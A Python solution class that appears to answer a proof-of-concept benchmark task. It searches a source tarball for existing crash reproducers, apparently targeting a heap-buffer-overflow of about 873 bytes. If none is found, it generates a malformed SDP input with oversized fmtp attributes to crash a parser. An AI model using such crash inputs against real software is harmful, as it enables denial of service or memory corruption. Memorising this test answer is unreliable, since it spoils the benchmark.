import os
import re
import tarfile
import io
import gzip
import bz2
import lzma
import zipfile


class Solution:
    TARGET_SIZE = 873
    MAX_SCAN_FILESIZE = 200000
    MAX_DECOMPRESSED_SIZE = 512000

    def solve(self, src_path: str) -> bytes:
        poc = self._extract_poc_from_tar_path(src_path)
        if poc is not None:
            return poc
        return self._generate_heuristic_poc()

    # ---------- Top-level extractors ----------

    def _extract_poc_from_tar_path(self, path: str):
        try:
            with tarfile.open(path, "r:*") as tar:
                return self._extract_poc_from_tarobj(tar)
        except tarfile.TarError:
            return None

    def _extract_poc_from_tarobj(self, tar: tarfile.TarFile):
        name_keywords = [
            "poc",
            "proof",
            "crash",
            "clusterfuzz",
            "testcase",
            "repro",
            "input",
            "seed",
            "corpus",
            "heap-buffer-overflow",
        ]
        keyword_re = re.compile("|".join(re.escape(k) for k in name_keywords), re.IGNORECASE)

        data_like_exts = {
            "",
            ".bin",
            ".dat",
            ".data",
            ".raw",
            ".sdp",
            ".poc",
            ".txt",
            ".inp",
        }

        best_score = None
        best_data = None

        for m in tar.getmembers():
            if not m.isreg():
                continue
            if m.size <= 0 or m.size > self.MAX_SCAN_FILESIZE:
                continue

            name = m.name
            lower = name.lower()
            base = os.path.basename(lower)
            ext = os.path.splitext(lower)[1]

            has_keyword = bool(keyword_re.search(lower))
            has_sdp_ext = ext in (".sdp", ".poc")
            in_poc_dir = "/poc" in lower or "/crash" in lower or "/repro" in lower

            if not (has_keyword or has_sdp_ext or in_poc_dir):
                continue

            try:
                f = tar.extractfile(m)
                if f is None:
                    continue
                data = f.read(self.MAX_SCAN_FILESIZE + 1)
            except Exception:
                continue
            if not data:
                continue

            decomp = self._maybe_decompress(data, lower)
            if decomp is not None and 0 < len(decomp) <= self.MAX_DECOMPRESSED_SIZE:
                data = decomp

            nested = self._maybe_extract_from_tar_bytes(data)
            if nested is not None:
                data = nested

            is_sdp = self._is_likely_sdp(data)

            if not (has_keyword or has_sdp_ext or in_poc_dir or is_sdp):
                continue

            data_penalty = 0 if ext in data_like_exts else 1
            type_penalty = 0 if is_sdp else 1
            size_score = abs(len(data) - self.TARGET_SIZE)

            score = (type_penalty, data_penalty, size_score, len(data), base)

            if best_score is None or score < best_score:
                best_score = score
                best_data = data

        return best_data

    # ---------- Helpers for nested/encoded artifacts ----------

    def _maybe_decompress(self, data: bytes, name_lower: str):
        try:
            if name_lower.endswith((".gz", ".gzip")):
                return gzip.decompress(data)
            if name_lower.endswith((".xz", ".lzma")):
                return lzma.decompress(data)
            if name_lower.endswith(".bz2"):
                return bz2.decompress(data)
            if name_lower.endswith(".zip"):
                with zipfile.ZipFile(io.BytesIO(data)) as zf:
                    best_info = None
                    best_score = None
                    for info in zf.infolist():
                        if info.is_dir():
                            continue
                        if info.file_size <= 0 or info.file_size > self.MAX_SCAN_FILESIZE:
                            continue
                        size_score = abs(info.file_size - self.TARGET_SIZE)
                        score = (size_score, info.file_size)
                        if best_score is None or score < best_score:
                            best_score = score
                            best_info = info
                    if best_info is not None:
                        return zf.read(best_info)
        except Exception:
            return None
        return None

    def _maybe_extract_from_tar_bytes(self, data: bytes):
        if len(data) < 262:
            return None
        if data[257:262] != b"ustar":
            return None
        try:
            with tarfile.open(fileobj=io.BytesIO(data), mode="r:*") as ntar:
                return self._extract_poc_from_tarobj(ntar)
        except tarfile.TarError:
            return None

    # ---------- SDP detector ----------

    def _is_likely_sdp(self, data: bytes) -> bool:
        if not data:
            return False
        try:
            text = data.decode("ascii", errors="ignore")
        except Exception:
            return False
        if len(text) < 10:
            return False
        ascii_ratio = len(text) / max(1, len(data))
        if ascii_ratio < 0.6:
            return False
        prefixes = ["v=", "o=", "s=", "c=", "t=", "m=", "a=", "b="]
        count = sum(1 for p in prefixes if p in text)
        return count >= 2

    # ---------- Fallback heuristic PoC generator ----------

    def _generate_heuristic_poc(self) -> bytes:
        # Construct an SDP-like input stressing attribute parsing.
        header_lines = [
            "v=0",
            "o=- 0 0 IN IP4 127.0.0.1",
            "s=-",
            "c=IN IP4 127.0.0.1",
            "t=0 0",
            "m=audio 9 RTP/AVP 0 96",
        ]

        long_value = "X" * 700
        funky_param = "param" + "A" * 200 + "==" + "B" * 100

        attr_lines = [
            "a=rtpmap:96 opus/48000/2",
            "a=fmtp:96 " + long_value,
            "a=fmtp:96 " + funky_param,
            # Deliberately unfinished last attribute (no newline) to stress end-of-value handling
            "a=fmtp:96 " + "C" * 150,
        ]

        sdp_text = "\r\n".join(header_lines + attr_lines)
        return sdp_text.encode("ascii", errors="ignore")
